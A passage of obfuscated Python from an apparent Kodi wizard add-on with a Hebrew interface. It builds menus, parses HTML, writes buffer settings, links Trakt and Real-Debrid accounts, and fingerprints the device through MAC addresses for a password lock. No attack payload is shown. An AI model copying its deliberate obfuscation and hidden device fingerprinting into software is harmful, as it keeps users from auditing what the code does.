						if OO0O0OOO0O0O0OOO0 .find ('='+O00OOO00OO00O000O ,OO0O0OOO0O0O0OOO0 .find (O00OOO00OO00O000O ,1 ))>-1 :#line:1698
							OO0O0OOO0O0O0OOO0 =OO0O0OOO0O0O0OOO0 [:OO0O0OOO0O0O0OOO0 .find ('='+O00OOO00OO00O000O ,OO0O0OOO0O0O0OOO0 .find (O00OOO00OO00O000O ,1 ))]#line:1699
						if OO0O0OOO0O0O0OOO0 .rfind (O00OOO00OO00O000O ,1 )>-1 :#line:1701
							OO0O0OOO0O0O0OOO0 =OO0O0OOO0O0O0OOO0 [1 :OO0O0OOO0O0O0OOO0 .rfind (O00OOO00OO00O000O )]#line:1702
					else :#line:1703
						if OO0O0OOO0O0O0OOO0 .find (" ")>0 :#line:1704
							OO0O0OOO0O0O0OOO0 =OO0O0OOO0O0O0OOO0 [:OO0O0OOO0O0O0OOO0 .find (" ")]#line:1705
						elif OO0O0OOO0O0O0OOO0 .find ("/")>0 :#line:1706
							OO0O0OOO0O0O0OOO0 =OO0O0OOO0O0O0OOO0 [:OO0O0OOO0O0O0OOO0 .find ("/")]#line:1707
						elif OO0O0OOO0O0O0OOO0 .find (">")>0 :#line:1708
							OO0O0OOO0O0O0OOO0 =OO0O0OOO0O0O0OOO0 [:OO0O0OOO0O0O0OOO0 .find (">")]#line:1709
					O0OO0O0O0OOO00O00 .append (OO0O0OOO0O0O0OOO0 .strip ())#line:1711
			OOO0OO00OO00O0OOO =O0OO0O0O0OOO00O00 #line:1712
		else :#line:1713
			O0OO0O0O0OOO00O00 =[]#line:1714
			for O000OO0000O00OOOO in OOO0OO00OO00O0OOO :#line:1715
				OO00OOOO0O000OO00 =u"</"+name #line:1716
				O0OO0O000000OO0O0 =O0OO0OOOO000OO000 .find (O000OO0000O00OOOO )#line:1718
				OOO0OO00O00O000O0 =O0OO0OOOO000OO000 .find (OO00OOOO0O000OO00 ,O0OO0O000000OO0O0 )#line:1719
				O000OO0OO0O0OO000 =O0OO0OOOO000OO000 .find ("<"+name ,O0OO0O000000OO0O0 +1 )#line:1720
				while O000OO0OO0O0OO000 <OOO0OO00O00O000O0 and O000OO0OO0O0OO000 !=-1 :#line:1722
					OO000O0O0O0OO00O0 =O0OO0OOOO000OO000 .find (OO00OOOO0O000OO00 ,OOO0OO00O00O000O0 +len (OO00OOOO0O000OO00 ))#line:1723
					if OO000O0O0O0OO00O0 !=-1 :#line:1724
						OOO0OO00O00O000O0 =OO000O0O0O0OO00O0 #line:1725
					O000OO0OO0O0OO000 =O0OO0OOOO000OO000 .find ("<"+name ,O000OO0OO0O0OO000 +1 )#line:1726
				if O0OO0O000000OO0O0 ==-1 and OOO0OO00O00O000O0 ==-1 :#line:1728
					O0OO0OOOO0OO0O000 =u""#line:1729
				elif O0OO0O000000OO0O0 >-1 and OOO0OO00O00O000O0 >-1 :#line:1730
					O0OO0OOOO0OO0O000 =O0OO0OOOO000OO000 [O0OO0O000000OO0O0 +len (O000OO0000O00OOOO ):OOO0OO00O00O000O0 ]#line:1731
				elif OOO0OO00O00O000O0 >-1 :#line:1732
					O0OO0OOOO0OO0O000 =O0OO0OOOO000OO000 [:OOO0OO00O00O000O0 ]#line:1733
				elif O0OO0O000000OO0O0 >-1 :#line:1734
					O0OO0OOOO0OO0O000 =O0OO0OOOO000OO000 [O0OO0O000000OO0O0 +len (O000OO0000O00OOOO ):]#line:1735
				if ret :#line:1737
					OO00OOOO0O000OO00 =O0OO0OOOO000OO000 [OOO0OO00O00O000O0 :O0OO0OOOO000OO000 .find (">",O0OO0OOOO000OO000 .find (OO00OOOO0O000OO00 ))+1 ]#line:1738
					O0OO0OOOO0OO0O000 =O000OO0000O00OOOO +O0OO0OOOO0OO0O000 +OO00OOOO0O000OO00 #line:1739
				O0OO0OOOO000OO000 =O0OO0OOOO000OO000 [O0OO0OOOO000OO000 .find (O0OO0OOOO0OO0O000 ,O0OO0OOOO000OO000 .find (O000OO0000O00OOOO ))+len (O0OO0OOOO0OO0O000 ):]#line:1741
				O0OO0O0O0OOO00O00 .append (O0OO0OOOO0OO0O000 )#line:1742
			OOO0OO00OO00O0OOO =O0OO0O0O0OOO00O00 #line:1743
		OO0OOO00O0O000OO0 +=OOO0OO00OO00O0OOO #line:1744
	return OO0OOO00O0O000OO0 #line:1746
def addItem (O0OOOO00OO0O0OOOO ,O0OO0O0O0O0O00O0O ,OOO0O0O00OO0000O0 ,O0OO00OO00OO0O00O ,O00OO0O0O0O0O0OO0 ,description =None ):#line:1748
	if description ==None :description =''#line:1749
	description ='[COLOR white]'+description +'[/COLOR]'#line:1750
	OO0OO000OO0OO0O0O =sys .argv [0 ]+"?url="+urllib .quote_plus (O0OO0O0O0O0O00O0O )+"&mode="+str (OOO0O0O00OO0000O0 )+"&name="+urllib .quote_plus (O0OOOO00OO0O0OOOO )+"&iconimage="+urllib .quote_plus (O0OO00OO00OO0O00O )+"&fanart="+urllib .quote_plus (O00OO0O0O0O0O0OO0 )#line:1751
	OO0000OO0O0000000 =True #line:1752
	OO000OOOO0O0O0000 =xbmcgui .ListItem (O0OOOO00OO0O0OOOO ,iconImage =O0OO00OO00OO0O00O ,thumbnailImage =O0OO00OO00OO0O00O )#line:1753
	OO000OOOO0O0O0000 .setInfo (type ="Video",infoLabels ={"Title":O0OOOO00OO0O0OOOO ,"Plot":description })#line:1754
	OO000OOOO0O0O0000 .setProperty ("fanart_Image",O00OO0O0O0O0O0OO0 )#line:1755
	OO000OOOO0O0O0000 .setProperty ("icon_Image",O0OO00OO00OO0O00O )#line:1756
	OO0000OO0O0000000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0OO000OO0OO0O0O ,listitem =OO000OOOO0O0O0000 ,isFolder =False )#line:1757
	return OO0000OO0O0000000 #line:1758
def get_params ():#line:1760
		OO0OOO0OOOOOO0000 =[]#line:1761
		O00O000000OOO000O =sys .argv [2 ]#line:1762
		if len (O00O000000OOO000O )>=2 :#line:1763
				O0O0000OOOO0OO0OO =sys .argv [2 ]#line:1764
				O0O00OO0OOOO0O0OO =O0O0000OOOO0OO0OO .replace ('?','')#line:1765
				if (O0O0000OOOO0OO0OO [len (O0O0000OOOO0OO0OO )-1 ]=='/'):#line:1766
						O0O0000OOOO0OO0OO =O0O0000OOOO0OO0OO [0 :len (O0O0000OOOO0OO0OO )-2 ]#line:1767
				OOO0O0OOO0000O0OO =O0O00OO0OOOO0O0OO .split ('&')#line:1768
				OO0OOO0OOOOOO0000 ={}#line:1769
				for O0OO000O0000O0OOO in range (len (OOO0O0OOO0000O0OO )):#line:1770
						OOOOO0O00000O000O ={}#line:1771
						OOOOO0O00000O000O =OOO0O0OOO0000O0OO [O0OO000O0000O0OOO ].split ('=')#line:1772
						if (len (OOOOO0O00000O000O ))==2 :#line:1773
								OO0OOO0OOOOOO0000 [OOOOO0O00000O000O [0 ]]=OOOOO0O00000O000O [1 ]#line:1774
		return OO0OOO0OOOOOO0000 #line:1776
def decode (OO0OOO000O000O000 ,O0OOOOOO00O00O00O ):#line:1781
    import base64 #line:1782
    O0O0OO0O0O0OOOO0O =[]#line:1783
    if (len (OO0OOO000O000O000 ))!=4 :#line:1785
     return 10 #line:1786
    O0OOOOOO00O00O00O =base64 .urlsafe_b64decode (O0OOOOOO00O00O00O )#line:1787
    for OO0000OOOOOOOO0OO in range (len (O0OOOOOO00O00O00O )):#line:1789
        OO00O0O0OOOOOO0O0 =OO0OOO000O000O000 [OO0000OOOOOOOO0OO %len (OO0OOO000O000O000 )]#line:1790
        O0000OOO0OO000OO0 =chr ((256 +ord (O0OOOOOO00O00O00O [OO0000OOOOOOOO0OO ])-ord (OO00O0O0OOOOOO0O0 ))%256 )#line:1791
        O0O0OO0O0O0OOOO0O .append (O0000OOO0OO000OO0 )#line:1792
    return "".join (O0O0OO0O0O0OOOO0O )#line:1793
def tmdb_list (O00OO0000O00O000O ):#line:1794
    O00O00OOOOOO0OOOO =decode ("7643",O00OO0000O00O000O )#line:1797
    return int (O00O00OOOOOO0OOOO )#line:1800
def u_list (OOOO0OOOO00O00OO0 ):#line:1801
    from math import sqrt #line:1803
    OO00O0O0O0OOOOO0O =tmdb_list (TMDB_NEW_API )#line:1804
    O0OO00O00000OOOO0 =str ((getHwAddr ('eth0'))*OO00O0O0O0OOOOO0O )#line:1806
    O0OO0OO0000O0O0O0 =int (O0OO00O00000OOOO0 [1 ]+O0OO00O00000OOOO0 [2 ]+O0OO00O00000OOOO0 [5 ]+O0OO00O00000OOOO0 [7 ])#line:1807
    OOO0O0O0O000OO0OO =(ADDON .getSetting ("pass"))#line:1809
    OOOO0OO0OO0000OO0 =(str (round (sqrt ((O0OO0OO0000O0O0O0 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1814
    if '.'in OOOO0OO0OO0000OO0 :#line:1815
     OOOO0OO0OO0000OO0 =(str (round (sqrt ((O0OO0OO0000O0O0O0 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1816
    if OOO0O0O0O000OO0OO ==OOOO0OO0OO0000OO0 :#line:1818
      O00O0OO0OOOOOOOO0 =OOOO0OOOO00O00OO0 #line:1820
    else :#line:1822
       if STARTP2 ()and STARTP ()=='ok':#line:1823
         return OOOO0OOOO00O00OO0 #line:1826
       O00O0OO0OOOOOOOO0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1827
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1828
       sys .exit ()#line:1829
    return O00O0OO0OOOOOOOO0 #line:1830
def disply_hwr ():#line:1833
   try :#line:1834
    O0000O00O0O000OO0 =tmdb_list (TMDB_NEW_API )#line:1835
    OOO0OO00O000OOO00 =str ((getHwAddr ('eth0'))*O0000O00O0O000OO0 )#line:1836
    O00O0000O0O00O0OO =(OOO0OO00O000OOO00 [1 ]+OOO0OO00O000OOO00 [2 ]+OOO0OO00O000OOO00 [5 ]+OOO0OO00O000OOO00 [7 ])#line:1843
    O0000OO00OOO000OO =(ADDON .getSetting ("action"))#line:1844
    wiz .setS ('action',str (O00O0000O0O00O0OO ))#line:1846
   except :pass #line:1847
def disply_hwr2 ():#line:1848
   try :#line:1849
    OOOOO000O0OO0O000 =tmdb_list (TMDB_NEW_API )#line:1850
    OOOO0O0O00000O00O =str ((getHwAddr ('eth0'))*OOOOO000O0OO0O000 )#line:1852
    O0OOO0OO0O000OOOO =(OOOO0O0O00000O00O [1 ]+OOOO0O0O00000O00O [2 ]+OOOO0O0O00000O00O [5 ]+OOOO0O0O00000O00O [7 ])#line:1861
    O000000OO000OOOO0 =(ADDON .getSetting ("action"))#line:1862
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0OOO0OO0O000OOOO )#line:1865
   except :pass #line:1866
def getHwAddr (O0OO0O0O00O00O000 ):#line:1868
   import subprocess ,time #line:1869
   OO0OOO0OOOOO00OOO ='windows'#line:1870
   if xbmc .getCondVisibility ('system.platform.android'):#line:1871
       OO0OOO0OOOOO00OOO ='android'#line:1872
   if xbmc .getCondVisibility ('system.platform.android'):#line:1873
     O0OOO0O00O00O00OO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1874
     O0O0000OOOO0OOOOO =re .compile ('link/ether (.+?) brd').findall (str (O0OOO0O00O00O00OO ))#line:1876
     O0OO0OOO0O000OO00 =0 #line:1877
     for OO0O00O0OOO00O000 in O0O0000OOOO0OOOOO :#line:1878
      if O0O0000OOOO0OOOOO !='00:00:00:00:00:00':#line:1879
          O0O00O0OO00OO000O =OO0O00O0OOO00O000 #line:1880
          O0OO0OOO0O000OO00 =O0OO0OOO0O000OO00 +int (O0O00O0OO00OO000O .replace (':',''),16 )#line:1881
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1883
       O00OOO000O0OO000O =0 #line:1884
       O0OO0OOO0O000OO00 =0 #line:1885
       O0OOO00000OO0000O =[]#line:1886
       O00O0O000O00OO00O =os .popen ("getmac").read ()#line:1887
       O00O0O000O00OO00O =O00O0O000O00OO00O .split ("\n")#line:1888
       for O0OOO0000O000OO00 in O00O0O000O00OO00O :#line:1890
            O0OOOOOO0OO0OOOOO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O0OOO0000O000OO00 ,re .I )#line:1891
            if O0OOOOOO0OO0OOOOO :#line:1892
                O0O0000OOOO0OOOOO =O0OOOOOO0OO0OOOOO .group ().replace ('-',':')#line:1893
                O0OOO00000OO0000O .append (O0O0000OOOO0OOOOO )#line:1894
                O0OO0OOO0O000OO00 =O0OO0OOO0O000OO00 +int (O0O0000OOOO0OOOOO .replace (':',''),16 )#line:1897
   else :#line:1899
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1900
   try :#line:1917
    return O0OO0OOO0O000OO00 #line:1918
   except :pass #line:1919
def getpass ():#line:1920
	disply_hwr2 ()#line:1922
def setpass ():#line:1923
    OO0OO0OO0OOO000O0 =xbmcgui .Dialog ()#line:1924
    O000000O0O0OO0O0O =''#line:1925
    O000O00OOOOO000OO =xbmc .Keyboard (O000000O0O0OO0O0O ,'הכנס סיסמה')#line:1927
    O000O00OOOOO000OO .doModal ()#line:1928
    if O000O00OOOOO000OO .isConfirmed ():#line:1929
           O000O00OOOOO000OO =O000O00OOOOO000OO .getText ()#line:1930
    wiz .setS ('pass',str (O000O00OOOOO000OO ))#line:1931
def setuname ():#line:1932
    O0OOOO0O0O00OO0OO =''#line:1933
    O0000O000O0OO00OO =xbmc .Keyboard (O0OOOO0O0O00OO0OO ,'הכנס שם משתמש')#line:1934
    O0000O000O0OO00OO .doModal ()#line:1935
    if O0000O000O0OO00OO .isConfirmed ():#line:1936
           O0OOOO0O0O00OO0OO =O0000O000O0OO00OO .getText ()#line:1937
           wiz .setS ('user',str (O0OOOO0O0O00OO0OO ))#line:1938
def powerkodi ():#line:1939
    os ._exit (1 )#line:1940
def buffer1 ():#line:1942
	O0OOO0OO0000OO0O0 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1943
	O000O0O0OO0OO0000 =xbmc .getInfoLabel ("System.Memory(total)")#line:1944
	OO0O0000OOO0OOOO0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1945
	O000OOO00O0OO0O00 =re .sub ('[^0-9]','',OO0O0000OOO0OOOO0 )#line:1946
	O000OOO00O0OO0O00 =int (O000OOO00O0OO0O00 )/3 #line:1947
	OOO0OOOOOOO0000O0 =O000OOO00O0OO0O00 *1024 *1024 #line:1948
	try :O0O0OOO0OO0O0O000 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1949
	except :O0O0OOO0OO0O0O000 =16 #line:1950
	O0O0O000000OOOO0O =DIALOG .yesno ('FREE MEMORY: '+str (OO0O0000OOO0OOOO0 ),'Based on your free Memory your optimal buffersize is: '+str (O000OOO00O0OO0O00 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1953
	if O0O0O000000OOOO0O ==1 :#line:1954
		with open (O0OOO0OO0000OO0O0 ,"w")as O0OO0O0O0O000OOOO :#line:1955
			if O0O0OOO0OO0O0O000 >=17 :OOOOO0O00O0OO00O0 =xml_data_advSettings_New (str (OOO0OOOOOOO0000O0 ))#line:1956
			else :OOOOO0O00O0OO00O0 =xml_data_advSettings_old (str (OOO0OOOOOOO0000O0 ))#line:1957
			O0OO0O0O0O000OOOO .write (OOOOO0O00O0OO00O0 )#line:1959
			DIALOG .ok ('Buffer Size Set to: '+str (OOO0OOOOOOO0000O0 ),'Please restart Kodi for settings to apply.','')#line:1960
	elif O0O0O000000OOOO0O ==0 :#line:1962
		OOO0OOOOOOO0000O0 =_OOOOO0O000OO00OOO (default =str (OOO0OOOOOOO0000O0 ),heading ="INPUT BUFFER SIZE")#line:1963
		with open (O0OOO0OO0000OO0O0 ,"w")as O0OO0O0O0O000OOOO :#line:1964
			if O0O0OOO0OO0O0O000 >=17 :OOOOO0O00O0OO00O0 =xml_data_advSettings_New (str (OOO0OOOOOOO0000O0 ))#line:1965
			else :OOOOO0O00O0OO00O0 =xml_data_advSettings_old (str (OOO0OOOOOOO0000O0 ))#line:1966
			O0OO0O0O0O000OOOO .write (OOOOO0O00O0OO00O0 )#line:1967
			DIALOG .ok ('Buffer Size Set to: '+str (OOO0OOOOOOO0000O0 ),'Please restart Kodi for settings to apply.','')#line:1968
def xml_data_advSettings_old (O0O0OO0000O00O0OO ):#line:1969
	O0O0OO0O0OOO00O00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O0O0OO0000O00O0OO #line:1979
	return O0O0OO0O0OOO00O00 #line:1980
def xml_data_advSettings_New (O0OO000OOOO0OO00O ):#line:1982
	OO0OOO0O00O00OO0O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O0OO000OOOO0OO00O #line:1994
	return OO0OOO0O00O00OO0O #line:1995
def write_ADV_SETTINGS_XML (O00O000000000O0OO ):#line:1996
    if not os .path .exists (xml_file ):#line:1997
        with open (xml_file ,"w")as OOO0O0O00OO0O00OO :#line:1998
            OOO0O0O00OO0O00OO .write (xml_data )#line:1999
def _OOOOO0O000OO00OOO (default ="",heading ="",hidden =False ):#line:2000
    ""#line:2001
    O000OOOO0O00O00O0 =xbmc .Keyboard (default ,heading ,hidden )#line:2002
    O000OOOO0O00O00O0 .doModal ()#line:2003
    if (O000OOOO0O00O00O0 .isConfirmed ()):#line:2004
        return unicode (O000OOOO0O00O00O0 .getText (),"utf-8")#line:2005
    return default #line:2006
def index ():#line:2008
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2009
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2010
	if AUTOUPDATE =='Yes':#line:2011
		if wiz .workingURL (WIZARDFILE )==True :#line:2012
			O0O0O0OOOO0O000OO =wiz .checkWizard ('version')#line:2013
			if O0O0O0OOOO0O000OO >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0O0O0OOOO0O000OO ),'wizardupdate',themeit =THEME2 )#line:2014
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2015
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2016
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2017
	if len (BUILDNAME )>0 :#line:2018
		OOOO0O000000OOO00 =wiz .checkBuild (BUILDNAME ,'version')#line:2019
		OO0OO0OO000OOOO0O ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2020
		if OOOO0O000000OOO00 >BUILDVERSION :OO0OO0OO000OOOO0O ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OO0OO0OO000OOOO0O ,OOOO0O000000OOO00 )#line:2021
		addDir (OO0OO0OO000OOOO0O ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2023
		try :#line:2025
		     O0OOOO0O0000OO0O0 =wiz .themeCount (BUILDNAME )#line:2026
		except :#line:2027
		   O0OOOO0O0000OO0O0 =False #line:2028
		if not O0OOOO0O0000OO0O0 ==False :#line:2029
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2030
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2031
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2034
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2035
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2036
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2040
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2042
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2044
def morsetup ():#line:2046
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2047
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2048
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2049
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2050
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2051
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2055
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2056
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2059
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2060
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2070
	setView ('files','viewType')#line:2071
def morsetup2 ():#line:2072
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2073
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2074
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2075
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2076
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2077
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2078
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2079
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2080
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2081
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2082
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2083
def fastupdate ():#line:2084
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2085
def forcefastupdate ():#line:2087
			OO0OO000O00OOOOOO ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2088
			wiz .ForceFastUpDate (ADDONTITLE ,OO0OO000O00OOOOOO )#line:2089
def rdsetup ():#line:2093
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2094
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2095
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2097
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2098
def traktsetup ():#line:2101
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2102
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2103
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2104
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2105
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2106
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2107
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2108
	setView ('files','viewType')#line:2109
def setautorealdebrid ():#line:2110
    from resources .libs import real_debrid #line:2111
    OOO000O0O00O0OOO0 =real_debrid .RealDebridFirst ()#line:2112
    OOO000O0O00O0OOO0 .auth ()#line:2113
def setrealdebrid ():#line:2115
    OOOO0000O000OOOOO =(ADDON .getSetting ("auto_rd"))#line:2116
    if OOOO0000O000OOOOO =='false':#line:2117
       ADDON .openSettings ()#line:2118
    else :#line:2119
        from resources .libs import real_debrid #line:2120
        OO0OO00OOOOO0OO00 =real_debrid .RealDebrid ()#line:2121
        OO0OO00OOOOO0OO00 .auth ()#line:2122
        rdon ()#line:2125
def resolveurlsetup ():#line:2127
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2128
def urlresolversetup ():#line:2129
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2130
def placentasetup ():#line:2132
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2133
def reptiliasetup ():#line:2134
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2135
def flixnetsetup ():#line:2136
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2137
def yodasetup ():#line:2138
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2139
def numberssetup ():#line:2140
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2141
def uranussetup ():#line:2142
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2143
def genesissetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2145
def net_tools (view =None ):#line:2147
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2148
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2149
	setView ('files','viewType')#line:2151
def speedMenu ():#line:2152
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2153
def viewIP ():#line:2154
	OO000OO0000OOO00O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2168
	OO0O0000OOO0OOO00 =[];OO00OO00O0OO00O00 =0 #line:2169
	for O000OOO00OO00O0O0 in OO000OO0000OOO00O :#line:2170
		OOOOO0OO00OO0O00O =wiz .getInfo (O000OOO00OO00O0O0 )#line:2171
		OOO0OOOO0O00OO0OO =0 #line:2172
		while OOOOO0OO00OO0O00O =="Busy"and OOO0OOOO0O00OO0OO <10 :#line:2173
			OOOOO0OO00OO0O00O =wiz .getInfo (O000OOO00OO00O0O0 );OOO0OOOO0O00OO0OO +=1 ;wiz .log ("%s sleep %s"%(O000OOO00OO00O0O0 ,str (OOO0OOOO0O00OO0OO )));xbmc .sleep (1000 )#line:2174
		OO0O0000OOO0OOO00 .append (OOOOO0OO00OO0O00O )#line:2175
		OO00OO00O0OO00O00 +=1 #line:2176
	OO0O0O00O00OOOOOO ,OO000O00O0000OO00 ,OO0O00OO0O000O00O =getIP ()#line:2177
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0000OOO0OOO00 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2178
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0O00O00OOOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2179
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O00O0000OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2180
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O00OO0O000O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2181
